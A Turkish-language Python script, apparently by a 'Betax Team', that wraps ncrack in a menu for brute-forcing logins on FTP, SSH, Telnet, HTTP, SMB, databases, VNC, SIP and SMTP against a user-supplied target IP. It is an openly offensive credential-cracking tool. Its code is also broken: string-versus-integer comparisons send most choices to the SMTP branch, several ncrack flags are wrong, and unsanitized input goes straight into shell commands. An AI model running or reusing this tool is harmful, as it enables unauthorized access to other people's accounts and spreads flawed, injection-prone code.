import random
import os
import time as t
os.system("apt-get install python-pip")
os.system("apt-get install figlet")
os.system("apt-get install toilet")
os.system("clear")
print("""
Betax Team
""")
colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
print(random.choice(colors))
print("""
 1)FTP  BruteForce Attack   [ FİLE TRANSER PROTOCOL ]
 2)SSH  BruteForce Attack   [ SECURE SHELL PROTOCOL ]
 3)Telnet BruteForce Attack [ TELNET PROTOCOL ]
 4)HTTP BruteForce Attack   [ HYPER TEXT TRANSFER PROTOCOL ]
 5)SMB  BruteForce Attack   [ SERVER MESSAGE BLOCK PROTOCOL ]
 6)PostgreSQl  BruteForce Attack
 7)SIP  BruteForce Attack   [ SESSİON INİTİATİON PROTOCOL ]
 8)Redis BruteForce Attack  [ REMOTE DİCTİONARY SERVER PROTOCOL ]
 9)VNC  BruteForce Attack   [ VİRTUAL NETWORK COMPUTİNG PROTOCOL ]
10)MySQL BruteForce Attack  [ MY STRUCTURED QUERY LANGUAGE ]
11)SMTP  BruteForce Attack  [ SİMPLE MAİL TRANSFER PROTOCOL ]	
 """)
print(random.choice(colors))
secim = int(input("Seçim Yapınız: "))
if (secim<12):
    hedefip = input("Hedef Ip Giriniz: ")
    kullaniciadi=input("Kullanici Adi Dosya Yolu:")
    sifre = input("Sifrelerin Bulunduğu Dosya Yolu Belirtin:")
    if(secim==1):
	    print(random.choice(colors))
	    print("FTP CRACK ACTİVE!!")
	    os.system('ncrack -P 21 -P ' + kullaniciadi + ' -P ' + sifre + " " + hedefip)

    elif(secim=="2"):
        print(random.choice(colors))
        print("SSH CRACK ACTİVE!!")
        os.system('ncrack -p 22 -u ' + kullaniciadi + ' -p ' + sifre + " " + hedefip)
        
    elif(secim=="3"):
        print(random.choice(colors))
        print("TELNET CRACK ACTİVE!!")
        os.system('ncrack -p 23 -u ' + kullaniciadi + ' -p ' + sifre + " " + hedefip)
        
    elif(secim=="4"):
        print(random.choice(colors))
        print("HTTP CRACK ACTİVE!!")
        os.system('ncrack -p 80 -u ' + kullaniciadi + ' -p ' + sifre + " " + hedefip)
        
    elif(secim=="5"):
        print(random.choice(colors))
        print("SMB CRACK ACTİVE!!")
        os.system('ncrack -p 445 -u ' + kullaniciadi + ' -p ' + sifre + " " + hedefip)
        
    elif(secim=="6"):
        print(random.choice(colors))
        print("POSTGRESQL CRACK ACTİVE!!")
        os.system('ncrack -p 5432 -u ' + kullaniciadi + ' -p ' + sifre + " " + hedefip)
        
    elif(secim=="7"):
        print(random.choice(colors))
        print("SIP CRACK ACTİVE!")
        os.system('ncrack -p 5060 -u ' + kullaniciadi + ' -p ' + sifre + " " + hedefip)
        
    elif(secim=="8"):
        print(random.choice(colors))
        print("REDİS CRACK ACTİVE!")
        os.system('ncrack -p 6379 -u ' + kullaniciadi + ' -p ' + sifre + " " + hedefip)

    elif(secim=="9"):
        print(random.choice(colors))
        print("VNC CRACK ACTİVE!")
        os.system('ncrack -p 5900 -u ' + kullaniciadi + ' -p ' + sifre + " " + hedefip)


    elif(secim=="10"):
        print(random.choice(colors))
        print("MYSQL CRACK ACTİVE")
        os.system('ncrack -p 3306 -u ' + kullaniciadi + ' -p ' + sifre + " " + hedefip)

    else:
        print(random.choice(colors))
        print("SMTP CRACK ACTİVE")
        os.system('ncrack -p 25 -u ' + kullaniciadi + ' -p ' + sifre + " " + hedefip)
    

else:
    print("Yanlış Seçim Yaptınız")